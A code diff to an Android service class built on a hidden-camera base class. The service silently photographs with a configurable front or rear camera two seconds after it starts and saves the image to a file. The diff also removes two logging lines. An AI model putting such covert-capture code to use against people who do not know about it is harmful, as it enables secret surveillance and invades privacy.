@@ -22,8 +22,9 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 
-public class Camera extends HiddenCameraService {
+abstract public class Camera extends HiddenCameraService {
     private String targetFile = null;
+    protected int facing;
 
     public Camera() {
     }
@@ -38,7 +39,7 @@ public class Camera extends HiddenCameraService {
     public int onStartCommand(Intent intent, int flags, int startId) {
         CameraConfig cameraConfig = new CameraConfig()
                 .getBuilder(this)
-                .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
+                .setCameraFacing(facing)
                 .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                 .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                 .build();
@@ -48,19 +49,12 @@ public class Camera extends HiddenCameraService {
             stopSelf();
         }
         startCamera(cameraConfig);
-        new android.os.Handler().postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                Log.i("camera", "taking picture");
-                takePicture();
-            }
-        }, 2000L);
+        new android.os.Handler().postDelayed(this::takePicture, 2000L);
         return START_NOT_STICKY;
     }
 
     @Override
     public void onImageCapture(@NonNull File imageFile) {
-        Log.i("camera", "got picture");
         try {
             Path targetPath = Paths.get(targetFile);
             Files.deleteIfExists(targetPath);
